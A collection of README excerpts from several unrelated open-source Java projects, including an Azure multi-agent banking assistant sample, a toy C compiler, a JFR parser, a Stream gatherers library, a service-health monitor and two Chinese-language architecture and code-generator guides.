> 插件配置项`archTemplate`是`gen-arch`命令生成脚手架目录与项目基础代码的配置文件地址。开放自定义方便大家根据自己团队需求进行定制化。格式说明后续补充，不过格式很简单，按示例中的配置自己应该就能看懂并应用。有兴趣更详细了解的参考源码[GenArchMojo](cap4j-ddd-codegen-maven-plugin/src/main/java/org/netcorepal/cap4j/ddd/codegen/GenArchMojo.java)

```shell
mvn cap4j-ddd-codegen:gen-arch
```
如果没有意外，`cap4j-ddd-codegen`插件将根据配置文件[cap4j-ddd-codegen-template.json](https://raw.githubusercontent.com/netcorepal/cap4j/main/cap4j-ddd-codegen-template.json)完成项目结构初始化！

#### 项目结构介绍
基于基础包路径配置，
```xml
<basePackage>org.netcorepal.cap4j.ddd.example</basePackage> 
```
`cap4j-ddd-codegen`插件在maven项目源码目录`src/main/java/org/netcorepal/cap4j/ddd/example`下将会生成4个`package`。
> - `_share`       公共代码
> - `adapter`      适配层(Interface Adapter)
> - `application`  应用层(Application Business Rules)
> - `domain`       领域层(Enterpprise Business Rules)

This project is designed as a Proof of Concept (PoC) to explore the innovative realm of generative AI within the context of multi-agent architectures. By leveraging Java and Microsoft Semantic Kernel AI orchestration framework, our aim is to build a chat web app to demonstrate the feasibility and reliability of using generative AI agents to transform user experience from web clicks to natural language conversations while maximizing reuse of the existing workload data and APIs.



## Overview
The core use case of this Proof of Concept (PoC) revolves around a banking personal assistant designed to revolutionize the way users interact with their bank account information, transaction history, and payment functionalities. Utilizing the power of generative AI within a multi-agent architecture, this assistant aims to provide a seamless, conversational interface through which users can effortlessly access and manage their financial data.

Instead of navigating through traditional web interfaces and menus, users can simply converse with the AI-powered assistant to inquire about their account balances, review recent transactions, or initiate payments. This approach not only enhances user experience by making financial management more intuitive and accessible but also leverages the existing workload data and APIs to ensure a reliable and secure service.

Invoices samples are included in the data folder to make it easy to explore payments feature. The payment agent equipped with OCR tools ( Azure Document Intelligence) will lead the conversation with the user to extract the invoice data and initiate the payment process. Other account fake data as transactions, payment methods and account balance are also available to be queried by the user. All data and services are exposed as external REST APIs and consumed by the agents to provide the user with the requested information.

## Features 
This project provides the following features and technical patterns:
 - Simple multi ai agents Java implementation using *gpt-4o-mini* on Azure Open AI.
 - Chat intent extraction and agent routing.
 - Agents tools configuration and automatic tools invocations with [Java Semantic Kernel](https://github.com/microsoft/semantic-kernel-java/).
 - Tools output cache scoped at chat conversation level.It improves functions call planning and parameters extraction for long chat.
 - Chat based conversation implemented as [React Single Page Application](https://react.fluentui.dev/?path=/docs/concepts-introduction--docs) with support for images upload.Supported images are invoices, receipts, bills jpeg/png files you want your virtual banking assistant to pay on your behalf.
 - Images scanning and data extraction with Azure Document Intelligence using [prebuilt-invoice](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/concept-invoice?view=doc-intel-4.0.0) model.
 - Import REST api contracts (OpenAPI yaml files) as agent tools, providing automatic rest client call. It uses code from Java Semantic Kernel [open-api-plugin code sample](https://github.com/microsoft/semantic-kernel-java/tree/main/samples/semantickernel-sample-plugins/semantickernel-openapi-plugin).
 - Add a copilot app side-by-side to your existing business microservices hosted on [Azure Container Apps](https://azure.microsoft.com/en-us/products/container-apps).
 - Automated Azure resources creation and solution deployment leveraging [Azure Developer CLI](https://learn.microsoft.com/en-us/azure/developer/azure-developer-cli/).

For complex agents conversation implementation, read more about [Autogen framework](https://github.com/microsoft/autogen).

### Architecture
![HLA](docs/assets/HLA.png)
The personal banking assistant is designed as a [vertical multi-agent system](./docs/multi-agents/introduction.md), with each agent specializing in a specific functional domain (e.g., account management, transaction history, payments). The architecture consists of the following key components:

- **Copilot Assistant Copilot App (Microservice)**: Serves as the central hub for processing user requests. It's a spring boot application implementing a vertical multi-agent architectures using Java Semantic Kernel to create Agents equipped with tools. in Java the Agent Router to understand user intent from chat interactions and routes the request to the appropriate domain-specific agent.
    - **Agent Router**: Acts as a user proxy, interpreting user intent based on chat inputs and directing the request to the specific domain agent. This component ensures that user queries are efficiently handled by the relevant agent. It uses **IntentExtractor** tool backed by GPT4 model to extract the user intent in a json format. If intent is 'None' clarifying questions are provided. 

    - **Account Agent**: Specializes in handling tasks related to banking account information, credit balance, and registered payment methods. It leverages specific Account service APIs to fetch and manage account-related data. Semantic Kernel HTTP plugin is used to create a tool definition from the rest api yaml contract (Open API specification) and automatically call the HTTP endpoint with input parameters extracted by gpt4 model from the chat conversation.

    - **Transactions Agent**: Focuses on tasks related to querying user bank movements, including income and outcome payments. This agent accesses account api to retrieve accountid and transaction history service to search for transactions and present them to the user.

    - **Payments Agent**: Dedicated to managing tasks related to submitting payments. It interacts with multiple APIs and tools, such as ScanInvoice (backed by Azure Document Intelligence), Account Service to retrieve account and payment methods info, Payment Service to submit payment processing and Transaction History service to check for previous paid invoices.

- **Existing Business APIs**: Interfaces with the backend systems to perform operations related to personal banking accounts, transactions, and invoice payments. These APIs are implemented as external spring boot microservices providing the necessary data and functionality consumed by agents to execute their tasks.
    - **Account Service (Microservice)**: Provides functionalities like retrieving account details by username, fetching payment methods, and getting registered beneficiaries. This microservice supports all 3 agents.

    - **Payments Service (Microservice)**: Offers capabilities to submit payments and notify transactions. It is a critical component for the Payments Agent to execute payment-related tasks efficiently.

    - **Reporting Service (Microservice)**: Enables searching transactions and retrieving transactions by recipient. This service supports the Transactions Agent in providing detailed transaction reports to the user and the Payment Agent as it needs to check if an invoice has not been already paid.

## Getting Started

### Run in GitHub Codespaces or VS Code Dev Containers

You can run this repo virtually by using GitHub Codespaces or VS Code Dev Containers.  Click on one of the buttons below to open this repo in one of those options.

[![Open in GitHub Codespaces](https://img.shields.io/static/v1?style=for-the-badge&label=GitHub+Codespaces&message=Open&color=brightgreen&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Open in VS Code Dev Containers](https://img.shields.io/static/v1?style=for-the-badge&label=Remote%20-%20Containers&message=Open&color=blue&logo=visualstudiocode)](https://vscode.dev/redirect?url=vscode://ms-vscode-remote.remote-containers/cloneInVolume?url=https://github.com/azure-samples/agent-openai-java-banking-assistant/)

All prerequisites are already installed in the container.  You can skip to the [Starting from scratch](#starting-from-scratch) section.

### Prerequisites

* [Java 17](https://learn.microsoft.com/en-us/java/openjdk/download#openjdk-17)
* [Maven 3.8.x](https://maven.apache.org/download.cgi)
* [Azure Developer CLI](https://aka.ms/azure-dev/install)
* [Node.js](https://nodejs.org/en/download/)
* [Git](https://git-scm.com/downloads)
* [Powershell 7+ (pwsh)](https://github.com/powershell/powershell) - For Windows users only.
  * **Important**: Ensure you can run `pwsh.exe` from a PowerShell command. If this fails, you likely need to upgrade PowerShell.


>[!WARNING] Your Azure Account must have `Microsoft.Authorization/roleAssignments/write` permissions, such as [User Access Administrator](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#user-access-administrator) or [Owner](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#owner).  

### Starting from scratch

You can clone this repo and change directory to the root of the repo. Or you can run `azd init -t Azure-Samples/agent-openai-java-banking-assistant`.

Once you have the project available locally, run the following commands if you don't have any pre-existing Azure services and want to start from a fresh deployment.

1. Run 

    ```shell
    azd auth login
    ```

2. Run 

    ```shell
    azd up
    ```
    
    * This will provision Azure resources and deploy this sample to those resources.
    * The project has been tested with gpt4-o-mini model which is currently available in these regions: **eastus** (Default), **swedencentral**.  For an up-to-date list of regions and models, check [here](https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/models)
    * The Azure Document Intelligence  new rest API is used which is currently available in these regions: **eastus**(Default), **westus2**, **westeurope**. More info [here](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/sdk-overview-v4-0?view=doc-intel-4.0.0&tabs=csharp)

3. After the application has been successfully deployed you will see a web app URL printed to the console.  Click that URL to interact with the application in your browser.  

It will look like the following:

!['Output from running azd up'](docs/assets/azd-success.png)


### Deploying with existing Azure resources

If you already have existing Azure resources, you can re-use those by setting `azd` environment values.

#### Existing resource group

1. Run `azd env set AZURE_RESOURCE_GROUP {Name of existing resource group}`
2. Run `azd env set AZURE_LOCATION {Location of existing resource group (i.e eastus2)}`

#### Existing OpenAI resource

1. Run `azd env set AZURE_OPENAI_SERVICE {Name of existing OpenAI service}`
2. Run `azd env set AZURE_OPENAI_RESOURCE_GROUP {Name of existing resource group that OpenAI service is provisioned to}`
3. Run `azd env set AZURE_OPENAI_SERVICE_LOCATION {Location of existing resource (i.e eastus2)}`. Only needed if your OpenAI resource is in a different location than the one you'll pick for the `azd up` step.
4. Run `azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT {Name of existing ChatGPT deployment}`. Only needed if your ChatGPT deployment is not the default 'gpt4-o-mini'.

#### Existing Azure Document Intelligence

1. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_SERVICE {Name of existing Azure Document Intelligence}`
2. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP {Name of existing resource group with Azure Document Intelligence service}`
3. If that resource group is in a different location than the one you'll pick for the `azd up` step,
   then run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP_LOCATION {Location of existing service}`

#### Other existing Azure resources

You can also use existing Form Recognizer and Storage Accounts. See `./infra/main.parameters.json` for list of environment variables to pass to `azd env set` to configure those existing resources.

#### Provision remaining resources

Now you can run `azd up`, following the steps in [Deploying from scratch](#deploying-from-scratch) above.
That will both provision resources and deploy the code.


### Redeploying

If you've only changed the backend/frontend code in the `app` folder, then you don't need to re-provision the Azure resources. You can just run:

```shell
azd deploy
```

If you've changed the infrastructure files (`infra` folder or `azure.yaml`), then you'll need to re-provision the Azure resources. You can do that by running:

```shell
azd up
```
 > [!WARNING]
 > When you run `azd up` multiple times to redeploy infrastructure, make sure to set the following parameters in `infra/main.parameters.json` to `true` to avoid container apps images from being overridden with default ""mcr.microsoft.com/azuredocs/containerapps-helloworld"" image:

```json
 ""copilotAppExists"": {
      ""value"": false
    },
    ""webAppExists"": {
      ""value"": false
    },
    ""accountAppExists"": {
      ""value"": false
    },
    ""paymentAppExists"": {
      ""value"": false
    },
    ""transactionAppExists"": {
      ""value"": false
    }
```

### Running locally

1. Run

    ```shell
    az login
    ```

2. Change dir to `app`

    ```shell
    cd app
    ```

3. Run the `./start-compose.ps1` (Windows) or `./start-compose.sh` (Linux/Mac) scripts or run the ""VS Code Task: Start App"" to start the project locally.
4. Wait for the docker compose to start all the containers (web, api, indexer) and refresh your browser to [http://localhost](http://localhost)


## Guidance

### Testing different gpt4 models and versions
The default LLM used in this project is *gpt-4o-mini*. It's a cost-efficient small model with enhanced planning, reasoning capabilities which are required by this use case to reliably select the right agent based on the chat conversation and to properly handle tools call.However, in case of long chat or some words, the model might fail sometimes to detect the right user intent especially when he/she asks to pay a bill based on image upload. Based on our tests *gpt4-o* provides better results but it's more expensive and slower. To read more about the models and prices, check [here](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/). 

You can test different models and versions by changing the , `AZURE_OPENAI_CHATGPT_MODEL`, `AZURE_OPENAI_CHATGPT_VERSION` and `AZURE_OPENAI_CHATGPT_DEPLOYMENT` environment variable to the desired model like below:

```shell
azd env set AZURE_OPENAI_CHATGPT_MODEL gpt-4o
azd env set AZURE_OPENAI_CHATGPT_VERSION 2024-05-13
azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT gpt-4o
```
### Enabling Application Insights

Applications Insights is enabled by default. It allows to investigate each request tracing along with the logging of errors.

If you want to disable it set the `AZURE_USE_APPLICATION_INSIGHTS` variable to false before running `azd up`

1. Run `azd env set AZURE_USE_APPLICATION_INSIGHTS false`
1. Run `azd up`

To see the performance data, go to the Application Insights resource in your resource group, click on the ""Investigate -> Performance"" blade and navigate to any HTTP request to see the timing data.
To inspect the performance of chat requests, use the ""Drill into Samples"" button to see end-to-end traces of all the API calls made for any chat request.
Under ""Trace & Events"" panel you can review custom Java informational logs to better understand content of OpenAI requests and responses.

![Tracing screenshot](docs/assets/transaction-tracing.png)

To see any exceptions and server errors, navigate to the ""Investigate -> Failures"" blade and use the filtering tools to locate a specific exception. You can see Java stack traces on the right-hand side.

### Enabling authentication

By default, the web app on ACA will have no authentication or access restrictions enabled, meaning anyone with routable network access to the web app can chat with your personal assistant.You can require authentication to your Microsoft Entra by following the [Add app authentication](https://learn.microsoft.com/en-us/azure/container-apps/authentication) tutorial and set it up against the deployed web app.


To then limit access to a specific set of users or groups, you can follow the steps from [Restrict your Microsoft Entra app to a set of users](https://learn.microsoft.com/entra/identity-platform/howto-restrict-your-app-to-a-set-of-users) by changing ""Assignment Required?"" option under the Enterprise Application, and then assigning users/groups access.  Users not granted explicit access will receive the error message -AADSTS50105: Your administrator has configured the application <app_name> to block users 

### App Continuous Integration with GitHub Actions

1. **Create a Service Principal for the github action pipeline**

    Use [az ad sp create-for-rbac](https://learn.microsoft.com/en-us/cli/azure/ad/sp#az_ad_sp_create_for_rbac) to create the service principal:
    
    ```bash
    groupId=$(az group show --name <resource-group-name>  --query id --output tsv)
    az ad sp create-for-rbac --name ""agent-openai-java-banking-assistant-pipeline-spi"" --role contributor --scope $groupId --sdk-auth
    ```
    Output is similar to:
    
    ```json
    {
    ""clientId"": ""xxxx6ddc-xxxx-xxxx-xxx-ef78a99dxxxx"",
    ""clientSecret"": ""xxxx79dc-xxxx-xxxx-xxxx-aaaaaec5xxxx"",
    ""subscriptionId"": ""xxxx251c-xxxx-xxxx-xxxx-bf99a306xxxx"",
    ""tenantId"": ""xxxx88bf-xxxx-xxxx-xxxx-2d7cd011xxxx"",
    ""activeDirectoryEndpointUrl"": ""https://login.microsoftonline.com"",
    ""resourceManagerEndpointUrl"": ""https://management.azure.com/"",
    ""activeDirectoryGraphResourceId"": ""https://graph.windows.net/"",
    ""sqlManagementEndpointUrl"": ""https://management.core.windows.net:8443/"",
    ""galleryEndpointUrl"": ""https://gallery.azure.com/"",
    ""managementEndpointUrl"": ""https://management.core.windows.net/""
    } 
    ```
    
    Save the JSON output because it is used in a later step. Also, take note of the clientId, which you need to update the service principal in the next section.

2. **Assign ACRPush permission to service Principal**
   
   This step enables the GitHub workflow to use the service principal to [authenticate with your container registry](https://learn.microsoft.com/en-us/azure/container-registry/container-registry-auth-service-principal) and to push a Docker image.
   Get the resource ID of your container registry. Substitute the name of your registry in the following az acr show command:
   ```bash
   registryId=$(az acr show --name <registry-name> --resource-group <resource-group-name> --query id --output tsv)
    ```

   Use [az role assignment create](https://learn.microsoft.com/en-us/cli/azure/role/assignment#az_role_assignment_create) to assign the AcrPush role, which gives push and pull access to the registry. Substitute the client ID of your service principal:
   ```bash
   az role assignment create --assignee <ClientId> --scope $registryId --role AcrPush
   ```

3. **Add the service principal to your GitHub environment secrets**

 - Go to your forked repository in GitHub and create an [environment]((https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)) called 'Development' (yes this is the exact name; don't change it). If you want to change the environment name (also adding new branches and environments, change the current branch/env mapping) you can do that, but make sure to change the pipeline code accordingly in `.github/workflows/azure-dev.yml`.
 - Create 'Development' environment [secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets#creating-encrypted-secrets-for-a-repository) as below:
    | Secret                | Value                                                                                      |
    |-----------------------|--------------------------------------------------------------------------------------------|
    | AZURE_CREDENTIALS     | The entire JSON output from the service principal creation step                            |
    | SPI_CLIENT_ID         | The service principal client id used as username to login to Azure Container Registry      |
    | SPI_CLIENT_SECRET     | The service principal client secret used as password to login to Azure Container Registry  |
 - Create 'Development' [environment variables](https://docs.github.com/en/actions/learn-github-actions/variables#creating-configuration-variables-for-an-environment) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACR_NAME                  | The name of the Azure Container registry                                                   |
    | RESOURCE_GROUP            | The name of the resource group where your Azure Container Environment has been deployed    |
 - Create [repository variables](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables#creating-configuration-variables-for-a-repository) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACA_DEV_ENV_NAME                  | The name of the Azure Container Apps Environment                                       |
    | COPILOT_ACA_DEV_APP_NAME      | The container app name for the copilot orchestrator app                                    |
    | WEB_ACA_DEV_APP_NAME          | The container app name for the web frontend  app                                           |

### Cost estimation

Pricing varies per region and usage, so it isn't possible to predict exact costs for your usage.
However, you can try the [Azure pricing calculator](https://azure.com/e/8ffbe5b1919c4c72aed89b022294df76) for the resources below.

- Azure Containers App: Consumption workload profile with 4 CPU core and 8 GB RAM. Pricing per vCPU and Memory. [Pricing](https://azure.microsoft.com/en-us/pricing/details/container-apps/)
- Azure OpenAI: Standard tier, ChatGPT and Ada models. Pricing per 1K tokens used, and at least 1K tokens are used per question. [Pricing](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/)
- Azure Document Intelligence: SO (Standard) tier using pre-built layout. [Pricing](https://azure.microsoft.com/pricing/details/form-recognizer/)

- Azure Blob Storage: Standard tier with ZRS (Zone-redundant storage). Pricing per storage and read operations. [Pricing](https://azure.microsoft.com/pricing/details/storage/blobs/)
- Azure Monitor: Pay-as-you-go tier. Costs based on data ingested. [Pricing](https://azure.microsoft.com/pricing/details/monitor/)

The first 180,000 vCPU-seconds, 360,000 GiB-seconds, and 2 million requests each month are free for ACA. To reduce costs, you can switch to free SKUs Document Intelligence by changing the parameters file under the `infra` folder. There are some limits to consider; for example, the free resource only analyzes the first 2 pages of each document. 

⚠️ To avoid unnecessary costs, remember to take down your app if it's no longer in use,
either by deleting the resource group in the Portal or running `azd down`.

minecraft8997/TennessineC,master,"![TennessineC logotype](misc/logotype.png)

# TennessineC
A small C compiler, written in pure Java, which is able to craft i386 Windows executables.

Currently, supports basic FFI (via `#pragma tenc import` directives), variables, functions (still WIP though), ""while""
loops, ""if"" statements, expressions containing braces, variables, function calls, constants and summation, subtraction
operators. The sole data type currently supported is `int` (32-bit word).

Note that at this moment I don't plan to strictly follow any of currently existing C standards, so this will probably
remain a toy compiler.

## Obtaining a pre-built binary
Please navigate to [Releases](https://github.com/minecraft8997/TennessineC/releases) section.

## Compiling [`examples/test.c`](https://github.com/minecraft8997/TennessineC/blob/master/examples/test.c)

Use the following command: `java -jar TennessineC.jar -s examples/test.c -dp -e WinI386 -o test.exe`
(-dp stands for Debug Preprocessor)

The compiler should craft the `test.exe` file.

## Building
Step 1. Ensure you have JDK 8 (or above) installed;

Step 2. Clone the repository: `git clone https://github.com/minecraft8997/TennessineC`;

Step 3. Import the project into IntelliJ IDEA;

Step 4. Navigate to File -> Project Structure -> Artifacts -> Add -> JAR -> From modules with dependencies...

Step 5. Select the main class `ru.deewend.tennessinec.TennessineC`, press OK;

Step 6. Press Apply;

Step 7. Navigate to Build -> Build Artifacts... -> TennessineC:jar -> Build;

Step 8. Your jarfile will be located in the `out/artifacts/TennessineC_jar` folder.

## What I use for development

I was inspired to start this project after checking out the documentation which fits into a single PNG image –
[PE101](https://github.com/corkami/pics/tree/master/binary/pe101).

Currently, for development I use [Tiny C Compiler](https://bellard.org/tcc/) to compile test snippets and
[Ghidra](https://github.com/NationalSecurityAgency/ghidra) for researching the output.

## 启动方式

1.启动加载器

`java -jar jcat-boot.jar`

2.选择目标jvm应用

## 常见问题

**找不到tools.jar包**

`java.lang.NoClassDefFoundError: com/sun/tools/attach/AttachNotSupportedException`
原因：该问题发生在jdk8，原因是%JAVA_HOME%/lib/tools.jar包不存在
解决办法：去oracle官网下载一个jdk8并把tools.jar复制到%JAVA_HOME%/lib/ 或%JAVA_HOME%/jre/lib/ext/ 目录中。

**连接attach目标虚拟机失败**

应用权限不够，改用管理员方式启动 `sudo java -jar jcat-boot.jar`

ℹ️ **About this Session**

> It’s easy to get started with Retrieval Augmented Generation, but you’ll quickly be disappointed with the generated answers: inaccurate or incomplete, missing context or outdated information, bad text chunking strategy, not the best documents returned by your vector database, and the list goes on.

> After meeting thousands of developers across Europe, we’ve explored those pain points, and will share with you how to overcome them. As part of the team building a vector database we are aware of the different flavors of searches (semantic, meta-data, full text, multimodal) and embedding model choices. We have been implementing RAG pipelines across different projects and frameworks and are contributing to LangChain4j.

> In this deep-dive, we will examine various techniques using LangChain4j to bring your RAG to the next level: with semantic chunking, query expansion & compression, metadata filtering, document reranking, data lifecycle processes, and how to best evaluate and present the results to your users.

---

### 1. **im-auth** - 登录鉴权模块

**服务端口**：8084

**主要功能**：

* **提供用户身份验证，确保访问的合法性。**
* **负责登录、注册、令牌生成和验证等功能。**
* **提供用户信息，提供rsa公钥，用于登录时用户密码加密。**
* **提供手机短信，用于通过手机号登录时发送相关验证码。**

**工作流程**：

* **用户的登录请求由**`im-auth`模块接收并验证身份。
* **验证通过后生成token，并将token 和 用户id  返回客户端以用于后续请求。**

---

### 2. **im-connect** - 长连接管理模块

**服务端口**：19000，19001，19002

**主要功能**：

* **负责客户端的长连接管理，确保与用户的持久连接稳定。**
* **长连接不做任何业务处理，只用于接收队列消息，并将消息发送给用户端。**
* **支持长连接的注册和心跳机制，通过RabbitMQ消息队列接收从**`im-server`转发的消息，并推送到用户的长连接。

**工作流程**：

* **客户端通过websocket请求与**`im-connect`建立长连接后，执行长连接注册并通过心跳维持连接。
* **长连接注册时会注册用户信息和机器码到redis中，后续网关会定向转发websocket请求到相应的服务**
* **每个**`im-connect`服务在启动时会生成机器码，并创建与机器码相关的RabbitMQ队列。
* **从RabbitMQ接收到的消息通过该长连接推送到用户客户端。**
* **用户断开连接会删除redis中的对应信息**

---

### 3. **im-server** - 业务逻辑处理模块

**服务端口**：8085

**主要功能**：

* **执行即时通讯的核心业务逻辑，包括消息发送、消息拉取、文件上传、群聊管理，群聊头像生成 等等。**
* **负责接收客户端的消息并分发到对应**`im-connect`服务的RabbitMQ队列。

**消息发送流程**：

1. **用户发送消息至**`im-server`模块。
2. `im-server`处理消息，并将其转发到对应的`im-connect`服务的RabbitMQ队列。
3. `im-connect`从RabbitMQ队列接收消息，并通过该用户的长连接推送到客户端。

---

### 4. **im-gateway** - 请求网关模块

**服务端口**：9191

**主要功能**：

* **作为所有客户端请求的入口，负责请求的负载均衡与转发。**
* **通过Nacos实现服务注册与发现，并支持负载均衡。**

**工作流程**：

* **所有客户端请求通过**`im-gateway`进入系统。
* `im-gateway`根据请求类型将其转发到相应的模块（如`im-auth`或`im-server`）。
* `im-gateway`根据Redis中的用户信息，将长连接请求定向转发至对应的`im-connect`服务。

**说明**：

* **集成了sentinel，可通过其来实现网关限流和负载均衡 。**

---

### 消息发送流程补充说明

1. **用户发送消息**：
   * **用户将消息发送到**`im-server`，由`im-server`进行业务处理。
2. **消息下发至`im-connect`**：
   * `im-server`将消息发送至对应的`im-connect`服务的RabbitMQ队列中。
   * **每个**`im-connect`服务在启动时生成机器码并创建与该机器码相关的RabbitMQ队列。
3. **`im-connect`处理消息**：
   * `im-connect`通过RabbitMQ接收来自`im-server`的消息，并将其通过用户长连接直接推送到客户端。
4. **长连接注册与心跳**：
   * **用户登录后，**`im-gateway`将长连接请求负载均衡到`im-connect`。
   * **客户端在**`im-connect`注册成功后，将用户信息存入Redis，并通过定期发送心跳包来维持连接。

JesusMiramontes/Heartbeatrr,main,"# Heartbeatrr Project - README

## Project Overview

Heartbeatrr is an easy-to-use service monitoring tool that helps you keep track of the health of your online services. Imagine you have a few websites, applications, or online services that you rely on, and you want to know if any of them go offline or experience issues. Heartbeatrr checks these services regularly and lets you know if something goes wrong.

### Here’s how it works:

1.	Service Health Monitoring: Heartbeatrr periodically checks the status of different services by “pinging” their URLs to see if they are responding. These services could be websites, APIs, or any other online system that provides a URL for checking availability.
2.	Automatic Alerts: If any of the services fail to respond or return an error, Heartbeatrr immediately sends a notification to your Discord channel. This way, you are promptly informed if something goes wrong without having to manually check everything.
3.	Configurable Timing: You can decide how often you want Heartbeatrr to check the services. For example, it could check them every 30 minutes, every hour, or at any interval that fits your needs. This is done through simple settings that are easy to adjust.
4.	Retry on Failure: Sometimes, services might be temporarily unavailable due to brief issues. Instead of notifying you immediately for every small hiccup, Heartbeatrr can retry the failed services a few times before sending an alert, just to make sure it’s not a short-term glitch.
5.	Customizable for Your Needs: You can easily tell Heartbeatrr which services to monitor by providing their URLs. It’s as simple as giving the app a list of web addresses, and it takes care of the rest.

## Who is it for?

Heartbeatrr is ideal for anyone who manages online services and wants to make sure everything is running smoothly without constantly checking manually. Whether you’re managing a few websites, APIs, or internal tools, Heartbeatrr gives you peace of mind by automatically checking the status of these services and notifying you of any issues.

This app is also great for those who use platforms like Discord for team communication. Instead of getting notifications via email or other channels, you’ll receive real-time alerts directly in your Discord chat, where you can quickly take action.

This simple yet powerful tool automates the health-checking process and keeps you informed, making it an essential part of your service management toolkit.

## Features
	- Periodic health checks for multiple services.
	- Configurable retries for failed health checks.
	- Sends alerts via Discord webhook when a service goes down.
	- Easily deployable using Docker.

## Docker Configuration
The project can be easily deployed using Docker. You need to configure the Docker environment variables to suit your needs. Here’s a breakdown of the variables you need to configure.

### Environment Variables

	- HEARTBEATRR_CONNECTION_TIMEOUT: Sets the HTTP connection timeout (in milliseconds). This determines how long the system waits for a service to respond before timing out. Example: 3000 (3 seconds).
	- HEARTBEATRR_RETRY_BACKOFF_DELAY: The delay (in milliseconds) between retry attempts when a health check fails. Example: 1000 (1 second).
	- HEARTBEATRR_RETRY_MAX_ATTEMPTS: Sets the maximum number of retry attempts for failed health checks. Example: 3.
	- HEARTBEATRR_HEALTHCHECK_SCHEDULE_DELAY: Delay between scheduled health checks (in seconds). This is how often the system will check the health of services. Example: 1800 (30 minutes).
	- HEARTBEATRR_SERVICES_URLS: A JSON-like object specifying the services to be checked and their URLs. For example: {""Google"":""http://google.com"", ""Yahoo"":""http://yahoo.com""}.
	- HEARTBEATRR_DISCORD_SERVICE_WEBHOOK: The Discord webhook URL to send notifications when services are down. This is required if you want to receive alerts.

## Steps to Run with Docker
1. Configure the docker-compose.yml file with the required services, retries, and Discord webhook.
2. Run the application with Docker Compose:
```bash
docker-compose up -d
```
3. The application will now start running and periodically check the services you’ve configured. If any service is down, you’ll receive a Discord notification.

Missing Stream API functionality you always longed for - provided via `Gatherers`

[![Stargazers over time](https://starchart.cc/pivovarit/more-gatherers.svg?variant=adaptive)](https://starchart.cc/pivovarit/more-gatherers)

## Project is under intense development and will be released alongside Java 24, when Stream Gatherers go GA (hopefully)

### Overview

Java's Stream API is a powerful tool for processing collections of data. However, it lacks some functionality that could make it even more powerful. This library aims to fill that gap by providing a set of `Gatherers` that can be used to collect data from a stream more flexibly.

Whenever possible, the library follows Project Reactor's naming conventions.

Provided `Gatherers`:
- `MoreGatherers.last(int)`
  - takes last `n` elements from the stream
- `MoreGatherers.sampling(int)`
  - takes every `n`-th element from the stream
- `MoreGatherers.zip(Iterator<T2>)`
  - zips `Stream` elements with elements from the provided `Iterator`
- `MoreGatherers.zip(Iterator<T2>, BiFunction<T1,T2>)`
  - zips `Stream` elements with elements from the provided `Iterator` using a custom zipper function
- `MoreGatherers.zip(Stream<T2>)`
  - zips `Stream` elements with elements from the provided `Stream`
- `MoreGatherers.zip(Stream<T2>, BiFunction<T1,T2>)`
  - zips `Stream` elements with elements from the provided `Stream` using a custom zipper function
- `MoreGatherers.zipWithIterable(Iterable<T2>)`
  - zips `Stream` elements with elements from the provided `Iterable`
- `MoreGatherers.zipWithIterable(Iterable<T2>, BiFunction<T1,T2>)`
  - zips elements with elements from the provided `Iterable` using a custom zipper function
- `MoreGatherers.zipWithIndex()`
  - zips `Stream` elements with their index
- `MoreGatherers.zipWithIndex(BiFunction<Long,T>)`
  - zips `Stream` elements with their index using a custom zipper function
- `MoreGatherers.distinctBy(Function<T, R>)`
  - takes distinct elements based on a key extractor function
- `MoreGatherers.distinctByKeepLast(Function<T, R>)`
  - takes distinct elements based on a key extractor function, keeping the last occurrence
- `MoreGatherers.distinctUntilChanged()`
  - takes elements until a change is detected
- `MoreGatherers.distinctUntilChanged(Function<T, R>)`
  - takes elements until a change is detected based on a key extractor function
- `MoreGatherers.windowSliding(int, int)`
  - creates a sliding window of a fixed size with a fixed step, extends `Gatherers.windowSliding(int)` by adding a step parameter
- `MoreGatherers.byIndex(BiPredicate<Long, T>)`
  - filters elements based on their index and value

### Philosophy

The primary goal of this library is to complement the existing Stream API by providing functionality that's currently missing without duplicating features already available. While it is technically possible to create numerous custom Gatherers, this library focuses on offering only those that cannot be easily achieved using standard Stream API operations.

The library is designed to be as lightweight as possible, with no external dependencies. It's implemented using core Java libraries and follows the same conventions as the standard Stream API, drawing inspiration from Project Reactor's method names.

jbachorik/jafar,main,"# jafar
Experimental, incomplete JFR parser

Very much a work in progress. 
The goal is to be able to parse JFR files and extract the event data in programmatic way with the least effort possible.

## Requirements
Java 21 (mostly just because I wanted to try the pattern matching)

## Tl;DR
Allow quickly wiring JFR with interface based handlers using bytecode generation.
I was nerdsniped by [@nitsanw](https://github.com/nitsanw) and quickly thrown together this more or less a PoC.

The parser is pretty fast, actually. You can try the demo app which will extract all the `jdk.ExecutionSample` events,
count the number of samples and calculate the sum of the associated thread ids (useful, right?). On Mac M1 and ~600MiB
JFR this takes around 1 second as compared to cca. 7 seconds using JMC parser. The JDK `jfr` tool will run out of memory,
but to be fair it is trying to print the full content of each event.

After the project is build via `./gradlew shadowJar` you can run the demo app with:
```shell
# The Jafar parser
java -jar demo/build/libs/demo-all.jar [jafar|jmc|jfr] path_to_jfr.jfr
```

## Usage
The main idea is to define a handling interface which corresponds to a JFR event type. The linking is done via `@JfrType` 
annotation. For convenience, there is a `JfrEvent` interface which can be extended to define the event handling interface.

The interface methods should correspond to the fields of the JFR event. The method names should be the same as the field names.
If the field name is not a valid Java identifier, the method will be linked with the field via `@JfrField` annotation.
